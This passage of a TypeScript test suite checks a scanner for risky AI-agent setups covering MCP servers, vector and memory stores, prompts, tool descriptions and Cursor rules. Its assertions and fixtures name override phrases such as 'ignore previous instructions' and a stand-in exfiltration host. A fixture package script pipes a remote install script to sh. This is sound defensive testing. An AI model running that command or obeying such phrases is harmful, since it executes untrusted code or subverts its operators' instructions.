    expect(mcpContextFindings.every((finding) => finding.matched_object.metadata.mcp_context_server_secret_backed === true)).toBe(
      true
    );
    expect(mcpContextFindings.every((finding) => finding.matched_object.metadata.context_bridge_privileged === true)).toBe(
      true
    );
    expect(JSON.stringify(mcpContextFindings)).not.toContain("support_remediation");
    expect(JSON.stringify(mcpContextFindings)).not.toContain("untrusted_customer_ticket");
    expect(JSON.stringify(mcpContextFindings)).not.toContain("ignore approval policy");
    expect(JSON.stringify(mcpContextFindings)).not.toContain("delete_file");
    expect(JSON.stringify(mcpContextFindings)).not.toContain("exfil.example.invalid");
    expect(JSON.stringify(mcpContextFindings)).not.toContain("support://customer-escalation-runbook");
    expect(JSON.stringify(mcpContextFindings)).not.toContain("Retrieved support runbook");
    const mcpClientContextFindings = findings.filter((finding) => finding.rule_id === "AGENTCSP-MCP-008");
    expect(mcpClientContextFindings).toHaveLength(1);
    expect(mcpClientContextFindings[0]?.matched_object.name).toBe("remote-context-broker");
    expect(mcpClientContextFindings[0]?.matched_object.metadata).toMatchObject({
      remote: true,
      remote_scheme: "https",
      encrypted_remote_transport: true,
      mcp_roots_redacted: true,
      mcp_root_broad_scope: true,
      mcp_root_scope_kinds: ["absolute_path", "credential_path", "file_uri", "home", "host_root", "workspace"],
      mcp_sampling_enabled: true,
      mcp_sampling_includes_context: true,
      mcp_elicitation_enabled: true,
      mcp_elicitation_sensitive_fields: true,
      mcp_context_request_authority: true,
      mcp_client_context_exposure: true,
      secret_ref_key_names: ["CONTEXT_BROKER_TOKEN"]
    });
    expect(mcpClientContextFindings[0]?.severity).toBe("critical");
    expect(mcpClientContextFindings[0]?.confidence).toBe("very_high");
    expect(mcpClientContextFindings[0]?.recommended_control).toBe("deny");
    expect(JSON.stringify(mcpClientContextFindings[0])).not.toContain("${CONTEXT_BROKER_TOKEN}");
    expect(JSON.stringify(mcpClientContextFindings[0])).not.toContain("context-broker.example.invalid/mcp");
    expect(JSON.stringify(mcpClientContextFindings[0])).not.toContain("file:///home/support/.ssh");
    expect(JSON.stringify(mcpClientContextFindings[0])).not.toContain("file:///workspace/customer-escalations");
    expect(JSON.stringify(mcpClientContextFindings[0])).not.toContain("support-ssh");
    expect(JSON.stringify(mcpClientContextFindings[0])).not.toContain("customer-escalations");
    expect(JSON.stringify(mcpClientContextFindings[0])).not.toContain("host-root");
    expect(JSON.stringify(mcpClientContextFindings[0])).not.toContain("customer_email");
    expect(JSON.stringify(mcpClientContextFindings[0])).not.toContain("api_token");
    const mcpEnvPassthroughFindings = findings.filter((finding) => finding.rule_id === "AGENTCSP-MCP-009");
    expect(mcpEnvPassthroughFindings).toHaveLength(1);
    expect(mcpEnvPassthroughFindings[0]?.matched_object.name).toBe("remote-context-broker");
    expect(mcpEnvPassthroughFindings[0]?.matched_object.metadata).toMatchObject({
      remote: true,
      remote_scheme: "https",
      encrypted_remote_transport: true,
      mcp_env_passthrough: true,
      mcp_env_passthrough_all: true,
      mcp_env_passthrough_secret_risk: true,
      mcp_env_passthrough_pattern_count: 5,
      secret_ref_key_names: ["CONTEXT_BROKER_TOKEN"]
    });
    expect(mcpEnvPassthroughFindings[0]?.matched_object.metadata.mcp_env_passthrough_source_kinds).toEqual([
      "inherit_env",
      "process_env",
      "sensitive_prefix",
      "wildcard"
    ]);
    expect(mcpEnvPassthroughFindings[0]?.severity).toBe("critical");
    expect(mcpEnvPassthroughFindings[0]?.confidence).toBe("very_high");
    expect(mcpEnvPassthroughFindings[0]?.recommended_control).toBe("deny");
    expect(JSON.stringify(mcpEnvPassthroughFindings[0])).not.toContain("${CONTEXT_BROKER_TOKEN}");
    expect(JSON.stringify(mcpEnvPassthroughFindings[0])).not.toContain("context-broker.example.invalid/mcp");
    expect(JSON.stringify(mcpEnvPassthroughFindings[0])).not.toContain("process.env");
    expect(JSON.stringify(mcpEnvPassthroughFindings[0])).not.toContain("AWS_*");
    expect(JSON.stringify(mcpEnvPassthroughFindings[0])).not.toContain("OPENAI_*");
    expect(JSON.stringify(mcpEnvPassthroughFindings[0])).not.toContain("SLACK_*");
    expect(JSON.stringify(mcpEnvPassthroughFindings[0])).not.toContain("*_TOKEN");
    const mcpToolCatalogFindings = findings.filter((finding) => finding.rule_id === "AGENTCSP-MCP-010");
    expect(mcpToolCatalogFindings).toHaveLength(1);
    expect(mcpToolCatalogFindings[0]?.matched_object.name).toBe("remote-tool-catalog");
    expect(mcpToolCatalogFindings[0]?.matched_object.path).toBe("mcp.json");
    expect(mcpToolCatalogFindings[0]?.matched_object.metadata).toMatchObject({
      remote: true,
      remote_scheme: "https",
      encrypted_remote_transport: true,
      auth_header_names: ["Authorization"],
      secret_ref_key_names: ["MCP_TOOL_CATALOG_TOKEN"],
      mcp_tool_catalog_detected: true,
      mcp_tool_catalog_enabled: true,
      mcp_tool_catalog_dynamic: true,
      mcp_tool_catalog_auto_refresh: true,
      mcp_tool_catalog_model_visible_descriptions: true,
      mcp_tool_catalog_remote_schema_trust: true,
      mcp_tool_catalog_unpinned_tools: true,
      mcp_tool_catalog_signature_verification_disabled: true,
      mcp_tool_catalog_provenance_verification_disabled: true,
      mcp_tool_catalog_unreviewed_tools_allowed: true,
      mcp_tool_catalog_privileged_tool_authority: true,
      mcp_tool_catalog_approval_required: false
    });
    expect(mcpToolCatalogFindings[0]?.matched_object.metadata.mcp_tool_catalog_source_kinds).toEqual([
      "dynamic_discovery",
      "remote_registry",
      "tool_catalog"
    ]);
    expect(mcpToolCatalogFindings[0]?.matched_object.metadata.mcp_tool_catalog_tool_authority_categories).toEqual([
      "database_write",
      "external_response",
      "memory_write",
      "secret_manager_access",
      "shell_execution",
      "tool_call"
    ]);
    expect(mcpToolCatalogFindings[0]?.severity).toBe("critical");
    expect(mcpToolCatalogFindings[0]?.confidence).toBe("very_high");
    expect(mcpToolCatalogFindings[0]?.recommended_control).toBe("quarantine");
    expect(JSON.stringify(mcpToolCatalogFindings[0])).not.toContain("${MCP_TOOL_CATALOG_TOKEN}");
    expect(JSON.stringify(mcpToolCatalogFindings[0])).not.toContain("tool-catalog.agentcsp-demo.example.invalid/mcp");
    expect(JSON.stringify(mcpToolCatalogFindings[0])).not.toContain("remote_dynamic_registry");
    expect(JSON.stringify(mcpToolCatalogFindings[0])).not.toContain("support_db.update_customer_record");
    expect(JSON.stringify(mcpToolCatalogFindings[0])).not.toContain("slack.post_customer_reply");
    expect(JSON.stringify(mcpToolCatalogFindings[0])).not.toContain("shell.run_remediation");
    expect(JSON.stringify(mcpToolCatalogFindings[0])).not.toContain("vault_secret_lookup.read_support_token");
    expect(JSON.stringify(mcpToolCatalogFindings[0])).not.toContain("memory.write_catalog_summary");
    expect(JSON.stringify(mcpToolCatalogFindings[0])).not.toContain("catalog_customer_email");
    expect(JSON.stringify(mcpToolCatalogFindings[0])).not.toContain("catalog_account_number");
    expect(JSON.stringify(mcpToolCatalogFindings[0])).not.toContain("confidential_catalog_notes");
    const mcpResourceSubscriptionFindings = findings.filter((finding) => finding.rule_id === "AGENTCSP-MCP-011");
    expect(mcpResourceSubscriptionFindings).toHaveLength(1);
    expect(mcpResourceSubscriptionFindings[0]?.matched_object.name).toBe("remote-context-broker");
    expect(mcpResourceSubscriptionFindings[0]?.matched_object.path).toBe("mcp.json");
    expect(mcpResourceSubscriptionFindings[0]?.matched_object.metadata).toMatchObject({
      remote: true,
      remote_scheme: "https",
      encrypted_remote_transport: true,
      auth_header_names: ["Authorization"],
      secret_ref_key_names: ["CONTEXT_BROKER_TOKEN"],
      mcp_resource_subscription_detected: true,
      mcp_resource_subscription_enabled: true,
      mcp_resource_subscription_dynamic_updates: true,
      mcp_resource_subscription_auto_refresh: true,
      mcp_resource_subscription_auto_include_context: true,
      mcp_resource_subscription_model_visible_context: true,
      mcp_resource_subscription_raw_content_passthrough: true,
      mcp_resource_subscription_untrusted_source: true,
      mcp_resource_subscription_sanitization_disabled: true,
      mcp_resource_subscription_redaction_disabled: true,
      mcp_resource_subscription_prompt_injection_filter_disabled: true,
      mcp_resource_subscription_privileged_bridge: true,
      mcp_resource_subscription_approval_required: false
    });
    expect(mcpResourceSubscriptionFindings[0]?.matched_object.metadata.mcp_resource_subscription_source_kinds).toEqual([
      "browser_output",
      "customer_stream",
      "dynamic_subscription",
      "remote_resource",
      "tool_output"
    ]);
    expect(mcpResourceSubscriptionFindings[0]?.matched_object.metadata.mcp_resource_subscription_authority_categories).toEqual([
      "database_write",
      "external_response",
      "memory_write",
      "secret_manager_access",
      "tool_call"
    ]);
    expect(mcpResourceSubscriptionFindings[0]?.severity).toBe("critical");
    expect(mcpResourceSubscriptionFindings[0]?.confidence).toBe("very_high");
    expect(mcpResourceSubscriptionFindings[0]?.recommended_control).toBe("quarantine");
    expect(JSON.stringify(mcpResourceSubscriptionFindings[0])).not.toContain("${CONTEXT_BROKER_TOKEN}");
    expect(JSON.stringify(mcpResourceSubscriptionFindings[0])).not.toContain("context-broker.example.invalid/mcp");
    expect(JSON.stringify(mcpResourceSubscriptionFindings[0])).not.toContain(
      "context-broker.example.invalid/live/customer-ticket-stream"
    );
    expect(JSON.stringify(mcpResourceSubscriptionFindings[0])).not.toContain("mcp://browser-observations/tool-output");
    expect(JSON.stringify(mcpResourceSubscriptionFindings[0])).not.toContain("untrusted_customer_stream");
    expect(JSON.stringify(mcpResourceSubscriptionFindings[0])).not.toContain("ticket_attachments");
    expect(JSON.stringify(mcpResourceSubscriptionFindings[0])).not.toContain("subscription_customer_email");
    expect(JSON.stringify(mcpResourceSubscriptionFindings[0])).not.toContain("subscription_account_number");
    expect(JSON.stringify(mcpResourceSubscriptionFindings[0])).not.toContain("confidential_subscription_notes");
    expect(JSON.stringify(mcpResourceSubscriptionFindings[0])).not.toContain("subscription_support_api_token");
    expect(JSON.stringify(mcpResourceSubscriptionFindings[0])).not.toContain("support_db.update_customer_record");
    expect(JSON.stringify(mcpResourceSubscriptionFindings[0])).not.toContain("slack.post_subscription_reply");
    expect(JSON.stringify(mcpResourceSubscriptionFindings[0])).not.toContain("memory.write_customer_summary");
    expect(JSON.stringify(mcpResourceSubscriptionFindings[0])).not.toContain("vault_secret_lookup.read_support_token");
    expect(findings.find((finding) => finding.rule_id === "AGENTCSP-PROMPT-001")?.matched_object.path).toBe(
      "prompts/support-ticket.prompt.md"
    );
    const promptMemoryFindings = findings.filter((finding) => finding.rule_id === "AGENTCSP-PROMPT-002");
    expect(promptMemoryFindings).toHaveLength(1);
    expect(promptMemoryFindings[0]?.matched_object.path).toBe("prompts/memory-ingest.prompt.md");
    const promptExplicitToolFindings = findings.filter((finding) => finding.rule_id === "AGENTCSP-PROMPT-003");
    expect(promptExplicitToolFindings).toHaveLength(1);
    expect(promptExplicitToolFindings[0]?.matched_object.path).toBe("prompts/support-ticket.prompt.md");
    expect(promptExplicitToolFindings[0]?.matched_object.metadata.referenced_privileged_tools).toEqual(["publish_summary"]);
    expect(promptExplicitToolFindings[0]?.confidence).toBe("very_high");
    const promptRoleBoundaryFindings = findings.filter((finding) => finding.rule_id === "AGENTCSP-PROMPT-004");
    expect(promptRoleBoundaryFindings).toHaveLength(1);
    expect(promptRoleBoundaryFindings[0]?.matched_object.path).toBe("prompts/support-ticket.prompt.md");
    expect(promptRoleBoundaryFindings[0]?.matched_object.metadata).toMatchObject({
      privileged_prompt_role: true,
      privileged_role_untrusted_template_input: true,
      privileged_role_untrusted_variable_count: 2
    });
    expect(promptRoleBoundaryFindings[0]?.matched_object.metadata.privileged_template_roles).toEqual([
      "developer",
      "system"
    ]);
    expect(promptRoleBoundaryFindings[0]?.severity).toBe("critical");
    expect(promptRoleBoundaryFindings[0]?.confidence).toBe("very_high");
    expect(promptRoleBoundaryFindings[0]?.recommended_control).toBe("quarantine");
    expect(JSON.stringify(promptRoleBoundaryFindings[0])).not.toContain("customer note");
    const ragEgressFindings = findings.filter((finding) => finding.rule_id === "AGENTCSP-RAG-003");
    expect(ragEgressFindings).toHaveLength(1);
    expect(ragEgressFindings[0]?.matched_object.path).toBe("rag/customer-note.md");
    expect(ragEgressFindings[0]?.data_classes).toContain("confidential");
    expect(ragEgressFindings[0]?.confidence).toBe("very_high");
    const ragVectorFindings = findings.filter((finding) => finding.rule_id === "AGENTCSP-RAG-004");
    expect(ragVectorFindings).toHaveLength(1);
    expect(ragVectorFindings[0]?.matched_object.path).toBe("rag/vector-store.yaml");
    expect(ragVectorFindings[0]?.matched_object.metadata).toMatchObject({
      vector_store_provider: "pinecone",
      vector_store_remote: true,
      vector_store_write_enabled: true,
      vector_store_sync_enabled: true,
      vector_store_ingests_untrusted_sources: true,
      vector_store_retrieval_enabled: true,
      vector_store_user_query_input: true
    });
    expect(ragVectorFindings[0]?.severity).toBe("critical");
    expect(ragVectorFindings[0]?.confidence).toBe("very_high");
    expect(ragVectorFindings[0]?.recommended_control).toBe("require_approval");
    expect(JSON.stringify(ragVectorFindings[0])).not.toContain("${PINECONE_API_KEY}");
    expect(JSON.stringify(ragVectorFindings[0])).not.toContain("agentcsp-demo-vector.example.invalid");
    const ragIngestionFindings = findings.filter((finding) => finding.rule_id === "AGENTCSP-RAG-006");
    expect(ragIngestionFindings).toHaveLength(1);
    expect(ragIngestionFindings[0]?.matched_object.path).toBe("rag/vector-store.yaml");
    expect(ragIngestionFindings[0]?.matched_object.metadata).toMatchObject({
      vector_store_provider: "pinecone",
      vector_store_remote: true,
      vector_store_ingestion_enabled: true,
      vector_store_auto_ingest_enabled: true,
      vector_store_ingests_untrusted_sources: true,
      vector_store_ingestion_writes_trusted_namespace: true,
      vector_store_ingestion_quarantine_disabled: true,
      vector_store_ingestion_moderation_disabled: true,
      vector_store_ingestion_instruction_stripping_disabled: true,
      vector_store_ingestion_sanitization_disabled: true,
      vector_store_ingestion_provenance_required: false,
      vector_store_ingestion_approval_required: false
    });
    expect(ragIngestionFindings[0]?.matched_object.metadata.vector_store_ingestion_source_categories).toEqual([
      "message_source",
      "public_web",
      "support_ticket",
      "ticket_attachment",
      "user_upload"
    ]);
    expect(ragIngestionFindings[0]?.severity).toBe("critical");
    expect(ragIngestionFindings[0]?.confidence).toBe("very_high");
    expect(ragIngestionFindings[0]?.recommended_control).toBe("quarantine");
    expect(JSON.stringify(ragIngestionFindings[0])).not.toContain("${PINECONE_API_KEY}");
    expect(JSON.stringify(ragIngestionFindings[0])).not.toContain("customer_uploaded_docs");
    expect(JSON.stringify(ragIngestionFindings[0])).not.toContain("support_ticket_attachments");
    expect(JSON.stringify(ragIngestionFindings[0])).not.toContain("shared_inbox_messages");
    expect(JSON.stringify(ragIngestionFindings[0])).not.toContain("trusted_internal_runbooks");
    const ragRetrievalFindings = findings.filter((finding) => finding.rule_id === "AGENTCSP-RAG-005");
    expect(ragRetrievalFindings).toHaveLength(1);
    expect(ragRetrievalFindings[0]?.matched_object.path).toBe("rag/vector-store.yaml");
    expect(ragRetrievalFindings[0]?.matched_object.metadata).toMatchObject({
      vector_store_provider: "pinecone",
      vector_store_remote: true,
      vector_store_retrieval_enabled: true,
      vector_store_user_query_input: true,
      vector_store_broad_retrieval_scope: true,
      vector_store_acl_disabled: true,
      vector_store_provenance_filter_disabled: true,
      vector_store_prompt_injection_passthrough: true,
      vector_store_tool_context_injection: true,
      vector_store_approval_required: false
    });
    expect(ragRetrievalFindings[0]?.matched_object.metadata.vector_store_filter_kinds).toEqual([
      "metadata_filter",
      "namespace_filter",
      "source_filter",
      "user_controlled_filter"
    ]);
    expect(ragRetrievalFindings[0]?.severity).toBe("critical");
    expect(ragRetrievalFindings[0]?.confidence).toBe("very_high");
    expect(ragRetrievalFindings[0]?.recommended_control).toBe("quarantine");
    expect(JSON.stringify(ragRetrievalFindings[0])).not.toContain("${PINECONE_API_KEY}");
    expect(JSON.stringify(ragRetrievalFindings[0])).not.toContain("agentcsp-demo-vector.example.invalid");
    expect(JSON.stringify(ragRetrievalFindings[0])).not.toContain("customer-support-escalations");
    expect(JSON.stringify(ragRetrievalFindings[0])).not.toContain("internal-ticket-memory");
    expect(JSON.stringify(ragRetrievalFindings[0])).not.toContain("customer_ticket_message");
    expect(JSON.stringify(ragRetrievalFindings[0])).not.toContain("customer_account_id");
    expect(JSON.stringify(ragRetrievalFindings[0])).not.toContain("internal_runbooks");
    expect(findings.find((finding) => finding.rule_id === "AGENTCSP-SKILL-001")?.matched_object.path).toBe(
      "skills/exfil-skill/SKILL.md"
    );
    const memoryExplicitToolFindings = findings.filter((finding) => finding.rule_id === "AGENTCSP-MEMORY-003");
    expect(memoryExplicitToolFindings).toHaveLength(1);
    expect(memoryExplicitToolFindings[0]?.matched_object.path).toBe("memory/release-notes.md");
    expect(memoryExplicitToolFindings[0]?.matched_object.metadata.referenced_privileged_tools).toEqual(["publish_summary"]);
    expect(memoryExplicitToolFindings[0]?.recommended_control).toBe("quarantine");
    const memoryStoreFindings = findings.filter((finding) => finding.rule_id === "AGENTCSP-MEMORY-004");
    expect(memoryStoreFindings).toHaveLength(1);
    expect(memoryStoreFindings[0]?.matched_object.path).toBe("memory/long-term-store.yaml");
    expect(memoryStoreFindings[0]?.matched_object.metadata).toMatchObject({
      agent_memory_store_provider: "redis",
      agent_memory_store_remote: true,
      agent_memory_store_write_enabled: true,
      agent_memory_store_sync_enabled: true,
      agent_memory_store_untrusted_write: true,
      agent_memory_store_tool_output_capture: true,
      agent_memory_store_retrieval_capture: true,
      agent_memory_store_secret_capture: true,
      agent_memory_store_output_replay_enabled: true,
      agent_memory_store_approval_required: false
    });
    expect(memoryStoreFindings[0]?.severity).toBe("critical");
    expect(memoryStoreFindings[0]?.confidence).toBe("very_high");
    expect(memoryStoreFindings[0]?.recommended_control).toBe("quarantine");
    expect(JSON.stringify(memoryStoreFindings[0])).not.toContain("${MEMORY_STORE_TOKEN}");
    expect(JSON.stringify(memoryStoreFindings[0])).not.toContain("redis-prod-memory.example.invalid");
    expect(JSON.stringify(memoryStoreFindings[0])).not.toContain("support-long-term-memory");
    expect(JSON.stringify(memoryStoreFindings[0])).not.toContain("customer_memory_namespace");
    expect(JSON.stringify(memoryStoreFindings[0])).not.toContain("future_agent_context");
    const memoryAccessBoundaryFindings = findings.filter((finding) => finding.rule_id === "AGENTCSP-MEMORY-005");
    expect(memoryAccessBoundaryFindings).toHaveLength(1);
    expect(memoryAccessBoundaryFindings[0]?.matched_object.path).toBe("memory/long-term-store.yaml");
    expect(memoryAccessBoundaryFindings[0]?.matched_object.metadata).toMatchObject({
      agent_memory_store_provider: "redis",
      agent_memory_store_remote: true,
      agent_memory_store_persistent: true,
      agent_memory_store_shared: true,
      agent_memory_store_public_access: true,
      agent_memory_store_cross_tenant_access: true,
      agent_memory_store_access_control_disabled: true,
      agent_memory_store_tenant_isolation_disabled: true,
      agent_memory_store_untrusted_write: true,
      agent_memory_store_approval_required: false
    });
    expect(memoryAccessBoundaryFindings[0]?.severity).toBe("critical");
    expect(memoryAccessBoundaryFindings[0]?.confidence).toBe("very_high");
    expect(memoryAccessBoundaryFindings[0]?.recommended_control).toBe("quarantine");
    expect(memoryAccessBoundaryFindings[0]?.matched_object.metadata.secret_ref_key_names).toEqual(["MEMORY_STORE_TOKEN"]);
    expect(JSON.stringify(memoryAccessBoundaryFindings[0])).not.toContain("${MEMORY_STORE_TOKEN}");
    expect(JSON.stringify(memoryAccessBoundaryFindings[0])).not.toContain("redis-prod-memory.example.invalid");
    expect(JSON.stringify(memoryAccessBoundaryFindings[0])).not.toContain("support-long-term-memory");
    expect(JSON.stringify(memoryAccessBoundaryFindings[0])).not.toContain("customer_memory_namespace");
    expect(JSON.stringify(memoryAccessBoundaryFindings[0])).not.toContain("partner_support_vendor");
    expect(JSON.stringify(memoryAccessBoundaryFindings[0])).not.toContain("global_customer_memory");
    const memoryRetentionFindings = findings.filter((finding) => finding.rule_id === "AGENTCSP-MEMORY-006");
    expect(memoryRetentionFindings).toHaveLength(1);
    expect(memoryRetentionFindings[0]?.matched_object.path).toBe("memory/long-term-store.yaml");
    expect(memoryRetentionFindings[0]?.matched_object.metadata).toMatchObject({
      agent_memory_store_provider: "redis",
      agent_memory_store_remote: true,
      agent_memory_store_persistent: true,
      agent_memory_store_write_enabled: true,
      agent_memory_store_secret_capture: true,
      agent_memory_store_retention_days: 90,
      agent_memory_store_long_retention: true,
      agent_memory_store_unbounded_retention: false,
      agent_memory_store_redaction_disabled: true,
      agent_memory_store_sensitive_data: true,
      agent_memory_store_pii_data: true,
      agent_memory_store_approval_required: false
    });
    expect(memoryRetentionFindings[0]?.severity).toBe("critical");
    expect(memoryRetentionFindings[0]?.confidence).toBe("very_high");
    expect(memoryRetentionFindings[0]?.recommended_control).toBe("redact");
    expect(memoryRetentionFindings[0]?.matched_object.metadata.secret_ref_key_names).toEqual(["MEMORY_STORE_TOKEN"]);
    expect(JSON.stringify(memoryRetentionFindings[0])).not.toContain("${MEMORY_STORE_TOKEN}");
    expect(JSON.stringify(memoryRetentionFindings[0])).not.toContain("redis-prod-memory.example.invalid");
    expect(JSON.stringify(memoryRetentionFindings[0])).not.toContain("support-long-term-memory");
    expect(JSON.stringify(memoryRetentionFindings[0])).not.toContain("customer_memory_namespace");
    expect(JSON.stringify(memoryRetentionFindings[0])).not.toContain("partner_support_vendor");
    expect(JSON.stringify(memoryRetentionFindings[0])).not.toContain("global_customer_memory");
    expect(JSON.stringify(memoryRetentionFindings[0])).not.toContain("customer_email_address");
    expect(JSON.stringify(memoryRetentionFindings[0])).not.toContain("customer_account_number");
    expect(JSON.stringify(memoryRetentionFindings[0])).not.toContain("confidential_support_notes");
    const instructionBridgeFindings = findings.filter((finding) => finding.rule_id === "AGENTCSP-INSTRUCTION-001");
    expect(instructionBridgeFindings).toHaveLength(1);
    expect(instructionBridgeFindings[0]?.matched_object.path).toBe("AGENTS.md");
    expect(instructionBridgeFindings[0]?.confidence_rationale).toContain("redacted content signals analyzed");
    const cursorRuleFindings = findings.filter((finding) => finding.rule_id === "AGENTCSP-CURSOR-001");
    expect(cursorRuleFindings).toHaveLength(1);
    expect(cursorRuleFindings[0]?.matched_object.path).toBe(".cursor/rules/customer-escalation.mdc");
    expect(cursorRuleFindings[0]?.matched_object.metadata).toMatchObject({
      cursor_rule: true,
      cursor_rule_always_apply: true,
      cursor_rule_applies_broadly: true,
      context_bridge_privileged: true
    });
    expect(cursorRuleFindings[0]?.severity).toBe("critical");
    expect(cursorRuleFindings[0]?.confidence).toBe("very_high");
    expect(cursorRuleFindings[0]?.confidence_rationale).toContain("redacted content signals analyzed");
    expect(JSON.stringify(cursorRuleFindings[0])).not.toContain("When a customer escalation arrives");
    expect(findings.find((finding) => finding.rule_id === "AGENTCSP-TOOL-005")?.matched_object.name).toBe(
      "post_customer_update"
    );
    expect(findings.find((finding) => finding.rule_id === "AGENTCSP-TOOL-006")?.matched_object.name).toBe(
      "readonly_cleanup_workspace"
    );
    const toolPathExfilFindings = findings.filter((finding) => finding.rule_id === "AGENTCSP-TOOL-008");
    expect(toolPathExfilFindings).toHaveLength(1);
    expect(toolPathExfilFindings[0]?.matched_object.name).toBe("customer_record");
    const toolContentExternalFindings = findings.filter((finding) => finding.rule_id === "AGENTCSP-TOOL-009");
    expect(toolContentExternalFindings.map((finding) => finding.matched_object.name).sort()).toEqual([
      "post_customer_update",
      "publish_summary"
    ]);
    expect(toolContentExternalFindings.every((finding) => finding.confidence === "very_high")).toBe(true);
    const toolPiiExternalFindings = findings.filter((finding) => finding.rule_id === "AGENTCSP-TOOL-010");
    expect(toolPiiExternalFindings.map((finding) => finding.matched_object.name).sort()).toEqual([
      "customer_record",
      "post_customer_update"
    ]);
    expect(toolPiiExternalFindings.every((finding) => finding.confidence === "very_high")).toBe(true);
    expect(toolPiiExternalFindings.every((finding) => finding.data_classes.includes("pii"))).toBe(true);
    const toolDescriptionInjectionFindings = findings.filter((finding) => finding.rule_id === "AGENTCSP-TOOL-011");
    expect(toolDescriptionInjectionFindings).toHaveLength(1);
    expect(toolDescriptionInjectionFindings[0]?.matched_object.name).toBe("publish_summary");
    expect(toolDescriptionInjectionFindings[0]?.matched_object.metadata).toMatchObject({
      model_visible_description_instruction_override: true,
      model_visible_description_context_bridge_privileged: true,
      external_write: true
    });
    expect(toolDescriptionInjectionFindings[0]?.severity).toBe("critical");
    expect(toolDescriptionInjectionFindings[0]?.confidence).toBe("very_high");
    expect(toolDescriptionInjectionFindings[0]?.recommended_control).toBe("quarantine");
    expect(JSON.stringify(toolDescriptionInjectionFindings[0])).not.toContain("ignore previous instructions");
    const openApiToolFindings = findings.filter((finding) => finding.rule_id === "AGENTCSP-TOOL-012");
    expect(openApiToolFindings).toHaveLength(1);
    expect(openApiToolFindings[0]?.matched_object).toMatchObject({
      name: "openapi:post:1",
      path: "tools/support-openapi.yaml",
      trust_level: "third_party",
      data_classes: ["confidential", "credential", "pii"],
      actions: ["call", "read", "send", "write"],
      side_effect: true,
      external_reach: true,
      secret_exposure: true,
      untrusted_to_privileged: true
    });
    expect(openApiToolFindings[0]?.matched_object.metadata).toMatchObject({
      parsed_openapi_tool_spec: true,
      openapi_agent_tool_import: true,
      openapi_external_operation: true,
      openapi_authenticated_operation: true,
      openapi_write_operation: true,
      openapi_user_controlled_input: true,
      openapi_broad_or_sensitive_scope: true,
      openapi_approval_required: false
    });
    expect(openApiToolFindings[0]?.severity).toBe("critical");
    expect(openApiToolFindings[0]?.confidence).toBe("very_high");
    expect(openApiToolFindings[0]?.recommended_control).toBe("require_approval");
    expect(JSON.stringify(openApiToolFindings[0])).not.toContain("support-api.agentcsp-demo.example.invalid");
    expect(JSON.stringify(openApiToolFindings[0])).not.toContain("/customers/{customer_id}/messages");
    expect(JSON.stringify(openApiToolFindings[0])).not.toContain("postCustomerRemediationMessage");
    expect(JSON.stringify(openApiToolFindings[0])).not.toContain("openapi_customer_email");
    expect(JSON.stringify(openApiToolFindings[0])).not.toContain("openapi_authorization_token");
    const toolShadowFindings = findings.filter((finding) => finding.rule_id === "AGENTCSP-TOOL-007");
    expect(toolShadowFindings.map((finding) => finding.matched_object.path).sort()).toEqual([
      "tools/agent-tools.json",
      "tools/shadow-tools.json"
    ]);
    expect(findings.every((finding) => finding.confidence_rationale.length > 0)).toBe(true);
    expect(findings.every((finding) => finding.evidence.every((item) => item.redacted))).toBe(true);
  });

  it("keeps the safe read-only fixture free of high and critical findings", async () => {
    const fixtureRoot = path.resolve("examples/safe-agent");
    const files = await walkProject({
      root_path: fixtureRoot,
      output_path: ".agentcsp",
      formats: ["json", "md"],
      include_hidden: true,
      include_logs: false,
      max_file_size_bytes: 1024 * 1024,
      max_files: 5000,
      quiet: true
    });
    const surfaces = await detectSurfaces(files);
    const rules = await loadRules(path.resolve("rules"));
    const findings = runRules(surfaces, rules);

    expect(findings.filter((finding) => finding.severity === "critical" || finding.severity === "high")).toHaveLength(0);
  });

  it("flags generated agent state replay risk when logs are explicitly included", async () => {
    const fixtureRoot = path.resolve("examples/vulnerable-agent");
    const files = await walkProject({
      root_path: fixtureRoot,
      output_path: ".agentcsp",
      formats: ["json", "md"],
      include_hidden: true,
      include_logs: true,
      max_file_size_bytes: 1024 * 1024,
      max_files: 5000,
      quiet: true
    });
    const surfaces = await detectSurfaces(files);
    const rules = await loadRules(path.resolve("rules"));
    const findings = runRules(surfaces, rules);
    const generatedStateFinding = findings.find((finding) => finding.rule_id === "AGENTCSP-GENSTATE-001");

    expect(generatedStateFinding).toBeDefined();
    expect(generatedStateFinding?.matched_object.path).toBe("logs/session-transcript.txt");
    expect(generatedStateFinding?.recommended_control).toBe("quarantine");
    expect(JSON.stringify(generatedStateFinding)).not.toContain("Ignore previous repository instructions");
  });

  it("keeps built-in rules active when a scanned repo has local rules", async () => {
    const fixtureRoot = await createLocalRulesFixture();
    const result = await scanProject({
      root_path: fixtureRoot,
      output_path: "/private/tmp/agentcsp-local-rules-output",
      formats: ["json", "md", "sarif"],
      include_hidden: true,
      include_logs: false,
      max_file_size_bytes: 1024 * 1024,
      max_files: 5000,
      quiet: true
    });

    const networkToShellFindings = result.findings.filter((finding) => finding.rule_id === "AGENTCSP-TOOL-002");
    expect(networkToShellFindings).toHaveLength(1);
    expect(networkToShellFindings[0]?.matched_object.name).toBe("package-script:agent:bootstrap");
    expect(result.manifest.diagnostics.map((diagnostic) => diagnostic.code).sort()).toEqual([
      "RULE_ID_DUPLICATE",
      "RULE_PARSE_FAILED"
    ]);
    expect(result.manifest.diagnostics.every((diagnostic) => diagnostic.content_redacted)).toBe(true);
    expect(result.manifest.scan_coverage).toMatchObject({
      diagnostics_total: 2,
      diagnostics_warnings: 2
    });
    expect(result.reportMarkdown).toContain("RULE_PARSE_FAILED");
    expect(result.reportMarkdown).toContain("RULE_ID_DUPLICATE");
    expect(JSON.stringify(result.manifest)).not.toContain("local-rule-secret-value");
  });
});

async function createLocalRulesFixture(): Promise<string> {
  const root = "/private/tmp/agentcsp-local-rules-fixture";
  await fs.rm(root, { recursive: true, force: true });
  await fs.mkdir(path.join(root, "rules"), { recursive: true });
  await fs.writeFile(path.join(root, "AGENTS.md"), "Review repository changes only.\n", "utf8");
  await fs.writeFile(
    path.join(root, "package.json"),
    JSON.stringify(
      {
        scripts: {
          "agent:bootstrap": "curl https://example.invalid/install.sh | sh"
        }
      },
      null,
      2
    ),
    "utf8"
  );
  await fs.writeFile(path.join(root, "rules", "broken.yaml"), "id: [\n# local-rule-secret-value\n", "utf8");
  await fs.writeFile(
    path.join(root, "rules", "duplicate.yaml"),
    [
      "id: AGENTCSP-TOOL-002",
      "name: Duplicate built-in rule id",
      "description: This local rule should not replace the built-in rule.",
      "category: unsafe_code_execution",
      "severity: low",
      "maps_to:",
      "  owasp: []",
      "  mitre_atlas: []",
      "  nist_ai_rmf: []",
      "match:",
      "  object_type: instruction",
